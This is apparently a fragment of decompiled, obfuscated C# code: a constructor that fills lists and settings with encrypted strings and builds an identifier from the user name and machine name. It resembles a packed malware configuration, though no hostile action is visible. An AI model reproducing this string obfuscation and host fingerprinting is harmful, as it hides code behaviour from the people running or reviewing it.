			tzJESwPzibp(getString_0(107385237)),
			tzJESwPzibp(getString_0(107385204)),
			tzJESwPzibp(getString_0(107384683)),
			tzJESwPzibp(getString_0(107384602)),
			tzJESwPzibp(getString_0(107390894)),
			tzJESwPzibp(getString_0(107384605)),
			tzJESwPzibp(getString_0(107384548)),
			tzJESwPzibp(getString_0(107384475)),
			tzJESwPzibp(getString_0(107384430)),
			tzJESwPzibp(getString_0(107384933)),
			tzJESwPzibp(getString_0(107384856)),
			tzJESwPzibp(getString_0(107384795)),
			tzJESwPzibp(getString_0(107384778)),
			tzJESwPzibp(getString_0(107384697)),
			tzJESwPzibp(getString_0(107384160)),
			tzJESwPzibp(getString_0(107384103)),
			tzJESwPzibp(getString_0(107384026)),
			tzJESwPzibp(getString_0(107383985)),
			tzJESwPzibp(getString_0(107383928)),
			tzJESwPzibp(getString_0(107390837)),
			tzJESwPzibp(getString_0(107384367)),
			tzJESwPzibp(getString_0(107384338)),
			tzJESwPzibp(getString_0(107384305)),
			tzJESwPzibp(getString_0(107384296)),
			tzJESwPzibp(getString_0(107384267)),
			tzJESwPzibp(getString_0(107390975)),
			tzJESwPzibp(getString_0(107384226)),
			tzJESwPzibp(getString_0(107383633)),
			tzJESwPzibp(getString_0(107383604)),
			tzJESwPzibp(getString_0(107388666)),
			tzJESwPzibp(getString_0(107383571)),
			tzJESwPzibp(getString_0(107383604)),
			tzJESwPzibp(getString_0(107383542)),
			tzJESwPzibp(getString_0(107383513)),
			tzJESwPzibp(getString_0(107383484)),
			tzJESwPzibp(getString_0(107383467)),
			tzJESwPzibp(getString_0(107383898)),
			tzJESwPzibp(getString_0(107383857)),
			tzJESwPzibp(getString_0(107383796)),
			tzJESwPzibp(getString_0(107383767)),
			tzJESwPzibp(getString_0(107383726)),
			tzJESwPzibp(getString_0(107383713)),
			tzJESwPzibp(getString_0(107383124)),
			tzJESwPzibp(getString_0(107383091)),
			tzJESwPzibp(getString_0(107383034)),
			tzJESwPzibp(getString_0(107382989)),
			tzJESwPzibp(getString_0(107382932)),
			tzJESwPzibp(getString_0(107382899)),
			tzJESwPzibp(getString_0(107383402)),
			tzJESwPzibp(getString_0(107383341)),
			tzJESwPzibp(getString_0(107383280)),
			tzJESwPzibp(getString_0(107383247)),
			tzJESwPzibp(getString_0(107383190)),
			tzJESwPzibp(getString_0(107383149)),
			tzJESwPzibp(getString_0(107382588)),
			tzJESwPzibp(getString_0(107382555)),
			tzJESwPzibp(getString_0(107382538)),
			tzJESwPzibp(getString_0(107382493)),
			tzJESwPzibp(getString_0(107382444)),
			tzJESwPzibp(getString_0(107382399)),
			tzJESwPzibp(getString_0(107382830)),
			tzJESwPzibp(getString_0(107382797)),
			tzJESwPzibp(getString_0(107382788)),
			tzJESwPzibp(getString_0(107382715)),
			tzJESwPzibp(getString_0(107382670)),
			tzJESwPzibp(getString_0(107385959)),
			tzJESwPzibp(getString_0(107382637)),
			tzJESwPzibp(getString_0(107382116)),
			tzJESwPzibp(getString_0(107382059)),
			tzJESwPzibp(getString_0(107381998)),
			tzJESwPzibp(getString_0(107381965)),
			tzJESwPzibp(getString_0(107381964)),
			tzJESwPzibp(getString_0(107381883)),
			tzJESwPzibp(getString_0(107381886)),
			tzJESwPzibp(getString_0(107382321)),
			tzJESwPzibp(getString_0(107382308)),
			tzJESwPzibp(getString_0(107382235)),
			tzJESwPzibp(getString_0(107382210)),
			tzJESwPzibp(getString_0(107382129)),
			tzJESwPzibp(getString_0(107381588)),
			tzJESwPzibp(getString_0(107381575))
		};
		qYFjYYmMGKdoc = new List<string>
		{
			tzJESwPzibp(getString_0(107381534)),
			tzJESwPzibp(getString_0(107381453)),
			tzJESwPzibp(getString_0(107381404)),
			tzJESwPzibp(getString_0(107381387)),
			tzJESwPzibp(getString_0(107381818)),
			tzJESwPzibp(getString_0(107381753)),
			tzJESwPzibp(getString_0(107381708)),
			tzJESwPzibp(getString_0(107381615))
		};
		KzxmThJmEyI = new List<string>
		{
			tzJESwPzibp(getString_0(107381046)),
			tzJESwPzibp(getString_0(107381013)),
			tzJESwPzibp(getString_0(107381000)),
			tzJESwPzibp(getString_0(107380919)),
			tzJESwPzibp(getString_0(107380886)),
			tzJESwPzibp(getString_0(107380869)),
			tzJESwPzibp(getString_0(107381304)),
			tzJESwPzibp(getString_0(107381271)),
			tzJESwPzibp(getString_0(107381238)),
			tzJESwPzibp(getString_0(107381205)),
			tzJESwPzibp(getString_0(107381172)),
			tzJESwPzibp(getString_0(107381139)),
			tzJESwPzibp(getString_0(107381130)),
			tzJESwPzibp(getString_0(107413345)),
			tzJESwPzibp(getString_0(107413268)),
			tzJESwPzibp(getString_0(107413235)),
			tzJESwPzibp(getString_0(107413226)),
			tzJESwPzibp(getString_0(107413193)),
			tzJESwPzibp(getString_0(107413152)),
			tzJESwPzibp(getString_0(107413591)),
			tzJESwPzibp(getString_0(107413558)),
			tzJESwPzibp(getString_0(107413517)),
			tzJESwPzibp(getString_0(107413516)),
			tzJESwPzibp(getString_0(107381046)),
			tzJESwPzibp(getString_0(107413475)),
			tzJESwPzibp(getString_0(107413402)),
			tzJESwPzibp(getString_0(107413357)),
			tzJESwPzibp(getString_0(107412844)),
			tzJESwPzibp(getString_0(107412803)),
			tzJESwPzibp(getString_0(107412730)),
			tzJESwPzibp(getString_0(107412697)),
			tzJESwPzibp(getString_0(107412656)),
			tzJESwPzibp(getString_0(107412647)),
			tzJESwPzibp(getString_0(107381013)),
			tzJESwPzibp(getString_0(107412606)),
			tzJESwPzibp(getString_0(107381000)),
			tzJESwPzibp(getString_0(107413085)),
			tzJESwPzibp(getString_0(107413020)),
			tzJESwPzibp(getString_0(107412979)),
			tzJESwPzibp(getString_0(107412946)),
			tzJESwPzibp(getString_0(107412937)),
			tzJESwPzibp(getString_0(107412896)),
			tzJESwPzibp(getString_0(107412863)),
			tzJESwPzibp(getString_0(107412318)),
			tzJESwPzibp(getString_0(107412245)),
			tzJESwPzibp(getString_0(107412236)),
			tzJESwPzibp(getString_0(107412195))
		};
		QHdIaewLqjzP = new List<string>
		{
			tzJESwPzibp(iEGJafDjDASROi(getString_0(107412122))),
			tzJESwPzibp(getString_0(107412105)),
			tzJESwPzibp(getString_0(107412524)),
			tzJESwPzibp(getString_0(107412427)),
			tzJESwPzibp(getString_0(107411790)),
			tzJESwPzibp(getString_0(107411693)),
			tzJESwPzibp(getString_0(107411600)),
			tzJESwPzibp(getString_0(107412015)),
			tzJESwPzibp(getString_0(107411922)),
			tzJESwPzibp(getString_0(107411825)),
			tzJESwPzibp(getString_0(107411220)),
			tzJESwPzibp(getString_0(107411123)),
			tzJESwPzibp(getString_0(107411542)),
			tzJESwPzibp(iEGJafDjDASROi(getString_0(107412122)))
		};
		DUhHuAgmahdlA = tzJESwPzibp(getString_0(107411445));
		jiYEBLyFlYFm = new List<string>
		{
			tzJESwPzibp(getString_0(107411364)),
			tzJESwPzibp(getString_0(107410658)),
			tzJESwPzibp(getString_0(107410976)),
			tzJESwPzibp(getString_0(107410270)),
			tzJESwPzibp(getString_0(107410044)),
			tzJESwPzibp(getString_0(107410362))
		};
		xdxALrKJFXo = new List<string>
		{
			tzJESwPzibp(getString_0(107409656)),
			tzJESwPzibp(getString_0(107409595)),
			tzJESwPzibp(getString_0(107409566))
		};
		mqtXpUEsyADCeMhK = getString_0(107396804);
		SAzKwwZvNpBJmh = getString_0(107396804);
		ouwEpEgHjWnKG = new DateTime(2000, 1, 1);
		BXjtjHbqwTr = new DateTime(2100, 1, 1);
		oFvDUXnLvZqk = getString_0(107396887);
		bHpZgRTqvrgm = getString_0(107410017);
		ipFNahvaPROEXk = getString_0(107396804);
		zrUyzrZPIDWlXhjp = getString_0(107396804);
		iejckOPbiTz = getString_0(107396804);
		RSSzlZRmoGgc = getString_0(107396887);
		KpTletVVYGesVgJ = getString_0(107396804);
		SBthqYiSUsxxBW = getString_0(107396804);
		vjYtJFEhxfpDHt = new List<string>
		{
			getString_0(107396222),
			getString_0(107395936),
			getString_0(107396256),
			getString_0(107395817)
		};
		VPYFBwfqxXvG = getString_0(107396804);
		NwFhVUnpoETLiI = getString_0(107409980);
		YvEHTcUVlCTu = getString_0(107396804);
		PCEnMQPjGdmTjQm = getString_0(107396804);
		dzRbLIqsNjPuSMGD = getString_0(107396804);
		NNrmRojQtuYk = string.Empty;
		iXfseuxLbWAXZhvhX = getString_0(107396804);
		UZkJWLUkRyDvTUrp = getString_0(107396804);
		MdHwutNkJil = getString_0(107396804);
		oDjaaHeTYdLRe = getString_0(107394302);
		feRJgYPEWeMNP = getString_0(107394302);
		EDESHBJwSxAb = getString_0(107396804);
		qmqZfdVPNDVrV = getString_0(107396804);
		hLzPqVUHNDBTRb = getString_0(107396887);
		BtqZqLQFBmO = getString_0(107396804);
		pRNPdGPeQpVEwPTl = getString_0(107396804);
		zgNfaeUpQdihuu = getString_0(107409975);
		rKaBoqYgSFA = getString_0(107396804);
		uSYjGfleGibTQ = getString_0(107396804);
		czzhrocutRhNfDX = getString_0(107409990);
		UVdZomBXmMpt = getString_0(107396804);
		pPdKhFVJmZO = getString_0(107396804);
		lfXqQowefBr = getString_0(107396804);
		RoAatMNYmLOJwniz = getString_0(107396804);
		TSgiQXLBAlXJz = getString_0(107409937);
		rpGuhsNBODlBd = getString_0(107396887);
		hZkeSSxAGfnv = getString_0(107396804);
		UCIuWzHoOKJbZ = getString_0(107396804);
		MORlMWTkXsY = getString_0(107396804);
		JYXUPHymAoH = new string[0];
		dnEIlaYQbZTn = getString_0(107396804);
		cWvIRXFCjdwL = true;
		SVTLWKUNoTrhH = getString_0(107396804);
		sBOTyxVoVCQkJ = false;
		XQmtXTGsKrTbZRB = false;
		SFPFOxOCIcuTMi = false;
		DPQGlgLKUqFEQNGu = true;
		jYzmyFxkGGuJi = getString_0(107409956);
		ZdcvQmUKIcPe = false;
		kWtTToUhSWi = false;
		goSZClWrjs = false;
		PwyBWpPgqFzY = false;
		GIsCSxnycEXIm = true;
		nQpitcjrIGsGL = getString_0(107409903) + Environment.UserName + getString_0(107409922) + Environment.MachineName + getString_0(107409869) + HSDASSgFriA.KzNxlIVvXTMnYo() + getString_0(107409896);
		zcCjHpzjUtXX = false;
		SKETPxbxKDPaU = new Stopwatch();
		FawBoUOtRlQs = 0;
		osEpTgsdhQw = 0;
		YIgbUMLXEZ = false;
		HkuaAWARBzGl = getString_0(107409887) + HSDASSgFriA.KzNxlIVvXTMnYo() + getString_0(107409846);
		xcNorQckRgJ = new string[1] { getString_0(107409841) };
		jTmqLrXLyeK = new List<string>();
		WearPPVsyOavvo = 0;
	}
}
